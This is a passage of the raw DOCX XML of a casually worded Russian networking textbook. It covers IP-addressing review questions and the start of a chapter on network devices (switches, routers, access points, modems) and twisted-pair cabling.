        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Порт</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — номер, указывающий на приложение на сервере (например, 80 для HTTP, 443 для HTTPS).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Localhost</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — локальный компьютер (`127.0.0.1` или `::1`).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Loopback</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — механизм обращения компьютера к самому себе (адрес `127.0.0.1`).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Контрольные вопросы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Теория:** Что такое IP-адрес? В чём разница между IPv4 и IPv6?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Теория:** Объясни, зачем нужна маска подсети. Что означает запись `/24`?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Расчёт:** Сколько хостов можно разместить в подсети `10.0.0.0/16`?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Теория:** Какие диапазоны IP-адресов являются приватными? Зачем они нужны?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Теория:** Что такое NAT? Зачем он используется?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Теория:** Объясни, как работает DNS. Опиши шаги резолвинга доменного имени `example.com`.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Практика:** Преобразуй IP-адрес `172.16.254.1` в двоичный вид.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Практика:** Разбери URL на компоненты:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   `ftp://user@ftp.example.com:21/files/document.pdf`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Критическое мышление:** Почему IPv6 до сих пор не полностью вытеснил IPv4, несмотря на нехватку адресов?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Расчёт:** Дана подсеть `192.168.5.0/28`. Определи:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Количество хостов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Адрес сети</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Broadcast-адрес</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Диапазон доступных IP для хостов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Поздравляю, чувак!</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Теперь ты знаешь, как работает адресация в интернете. IP-адреса, DNS, URL — это основа основ. Без этого понимания дальнейшие главы про протоколы и модель OSI будут для тебя тёмным лесом. А так — красавчик, всё схватил! 🎉</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Глава 8.2. Сетевые компоненты. Среды передачи данных</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Введение: Как вообще это всё работает?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Окей, в прошлой главе разобрались с IP-адресами и доменными именами. Теперь вопрос: а как вообще данные </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>физически</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> передаются от твоего компа до сервера где-то в Амстердаме? Магия? Нет, бро, это называется </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>сетевое оборудование</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> и </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>среды передачи данных</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Представь себе почту. У тебя есть письмо (пакет данных), адрес (IP), но чтобы письмо дошло, нужны:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Почтальон** (сетевая карта)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Дороги** (кабели или Wi-Fi)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Сортировочные центры** (коммутаторы, маршрутизаторы)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Без этого твой пакет никуда не полетит. Вот об этом и поговорим.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>1. Сетевые устройства: кто за что отвечает</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>1.1. Сетевая карта (NIC — Network Interface Card)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Это </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>базовое</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> устройство, которое есть в каждом компе. Без него ты вообще не сможешь подключиться к сети. Сетевая карта (или сетевой адаптер) преобразует данные из компьютера в сигналы, которые можно передать по кабелю или эфиру.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ключевые характеристики</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**MAC-адрес** — уникальный идентификатор карты (типа паспорт). Формат: `AA:BB:CC:DD:EE:FF` (6 байт в hex).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Скорость** — 100 Мбит/с (Fast Ethernet), 1 Гбит/с (Gigabit Ethernet), 10 Гбит/с, 40 Гбит/с и выше.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Тип подключения** — проводная (Ethernet RJ-45) или беспроводная (Wi-Fi).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>: Твоя сетевая карта Intel I225-V поддерживает 2.5 Гбит/с, а соседская древняя Realtek RTL8139 — только 100 Мбит/с. Угадай, у кого торренты быстрее качаются?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>1.2. Репитер (Repeater) — усилитель сигнала</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Сигнал в кабеле </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>затухает</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> с расстоянием. Репитер просто </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>усиливает</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> его, чтобы данные дошли дальше. Это тупое устройство: получил сигнал → усилил → отправил дальше. Никакой логики.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ограничения</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Не фильтрует трафик.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Не анализирует пакеты.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Усиливает **всё**, включая шум и ошибки.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>: В офисе 80 метров между компами, а витая пара работает до 100 метров. Втыкаешь репитер посередине — профит, сигнал дотянули.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>1.3. Хаб (Hub) — динозавр из 90-х</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Хаб — это </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>многопортовый репитер</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Получил пакет на одном порту → разослал </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>всем</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> остальным портам. Да, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ВСЕМ</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, даже тем, кому этот пакет не нужен. Это называется </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>broadcast</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (широковещание).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблемы хабов</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Коллизии** — если два компа отправят пакеты одновременно, они столкнутся. Надо повторять передачу.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Низкая производительность** — все делят общую пропускную способность (если хаб 100 Мбит/с на 8 портов, то каждый порт может получить в среднем ~12.5 Мбит/с).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Небезопасно** — любой комп видит трафик других компов (сниффинг).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вердикт</w:t>
      </w:r>
      <w:r>
        <w:t>: Хабы вымерли как динозавры. Если у тебя где-то стоит хаб — выбрось его нахрен и купи свитч.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>1.4. Коммутатор (Switch) — умный братан хаба</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Свитч — это </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>разумная</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> замена хаба. Он запоминает, какой </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>MAC-адрес</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> на каком порту, и отправляет пакеты </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>только</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> нужному получателю, а не всем подряд.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как работает</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Получает пакет.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Смотрит MAC-адрес получателя.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Проверяет таблицу коммутации (MAC Address Table).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Отправляет пакет **только** на нужный порт.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Преимущества</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Нет коллизий** — каждый порт работает в режиме full-duplex (одновременно приём и передача).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Высокая производительность** — каждый порт получает полную пропускную способность (свитч 1 Гбит/с → каждый из 24 портов работает на 1 Гбит/с).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Безопасность** — трафик изолирован между портами.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Работа на уровне OSI</w:t>
      </w:r>
      <w:r>
        <w:t>: Layer 2 (канальный уровень) — работает с MAC-адресами.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>: У тебя домашний гигабитный свитч TP-Link TL-SG108 на 8 портов. Все порты 1 Гбит/с. Подключил 4 компа — каждый получает полный гигабит (в теории, на практике зависит от нагрузки).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>1.5. Маршрутизатор (Router) — мозг сети</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Роутер — это устройство, которое </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>соединяет разные сети</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> и решает, куда отправить пакет, чтобы он дошёл до адресата. Работает на </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Layer 3</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (сетевой уровень) и оперирует </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>IP-адресами</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Основные функции</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Маршрутизация** — выбор оптимального пути для пакета (используя таблицу маршрутизации и протоколы типа OSPF, BGP).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**NAT (Network Address Translation)** — преобразование приватных IP (192.168.x.x) в публичный IP провайдера. Благодаря этому вся твоя домашняя сеть сидит под одним публичным IP.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**DHCP** — раздача IP-адресов устройствам в локальной сети.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Файрвол** — фильтрация трафика (блокировка портов, защита от атак).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>: Твой домашний роутер Keenetic Giga подключён к интернету (WAN-порт), а к нему подключены 3 компа и 5 смартфонов (LAN + Wi-Fi). Роутер раздаёт им IP из диапазона 192.168.1.0/24, а наружу всё идёт через один публичный IP, выданный провайдером.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Расчёт</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Если у тебя интернет 300 Мбит/с, а через роутер одновременно качают 5 устройств, то </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>в идеале</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> каждому достанется по 60 Мбит/с. Но на практике будет меньше из-за потерь, задержек и протоколов.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>1.6. Точка доступа (Access Point) — раздатчик Wi-Fi</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Access Point (AP) — это устройство, которое создаёт </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>беспроводную сеть</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Wi-Fi). По сути, это мост между проводной и беспроводной сетью.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Режимы работы</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**AP-режим** — создаёт Wi-Fi сеть (обычный режим).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Repeater** — усиливает существующий Wi-Fi сигнал.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Bridge** — соединяет две проводные сети через Wi-Fi.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Характеристики</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Стандарт Wi-Fi**: 802.11n (до 600 Мбит/с), 802.11ac (до 3.5 Гбит/с), 802.11ax (Wi-Fi 6, до 9.6 Гбит/с).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Частоты**: 2.4 ГГц (дальше, но медленнее) и 5 ГГц (быстрее, но меньше радиус).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Количество антенн** (MIMO — Multiple Input Multiple Output) — чем больше, тем лучше скорость и стабильность.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>: Установил в офисе Ubiquiti UniFi AP AC Pro. Он работает на обеих частотах (dual-band), поддерживает до 200 клиентов, скорость до 1.3 Гбит/с (в теории). На практике с 50 устройствами каждый получает ~20-30 Мбит/с.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>1.7. Модем — переводчик сигналов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Модем (MOdulator-DEModulator) преобразует </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>цифровые</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> сигналы компьютера в </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>аналоговые</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> для передачи по телефонной линии (DSL) или кабельной сети, и обратно.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Типы</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**DSL-модем** — работает по телефонной линии (ADSL, VDSL). Скорость до 100 Мбит/с (VDSL2).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Кабельный модем** (DOCSIS) — по коаксиальному кабелю (как у кабельного ТВ). Скорость до 1 Гбит/с (DOCSIS 3.1).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Оптический модем (ONT)** — для оптоволокна (GPON). Скорость до 10 Гбит/с.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**4G/5G модем** — мобильный интернет через сотовую сеть.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Важно</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Многие домашние роутеры — это </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>модем + роутер + точка доступа</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> в одном корпусе (all-in-one).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2. Среды передачи данных: по чему летят пакеты</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>2.1. Проводные среды</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>2.1.1. Витая пара (Twisted Pair)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Самая </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>популярная</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> среда для локальных сетей. Состоит из 8 проводов (4 пары), скрученных попарно. Скручивание уменьшает </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>электромагнитные помехи</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (EMI).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Типы</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**UTP (Unshielded Twisted Pair)** — без экрана. Дешёвая, но чувствительна к помехам.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**STP (Shielded Twisted Pair)** — с экраном (фольгой). Защита от помех, но дороже.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**FTP (Foiled Twisted Pair)** — общий экран на все пары.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**S/FTP** — экран на всю оболочку + на каждую пару отдельно. Максимальная защита.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Категории</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (чем выше, тем лучше):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Cat5e** — до 1 Гбит/с, частота 100 МГц, макс. длина 100 м.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Cat6** — до 10 Гбит/с (на 55 м) или 1 Гбит/с (на 100 м), частота 250 МГц.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
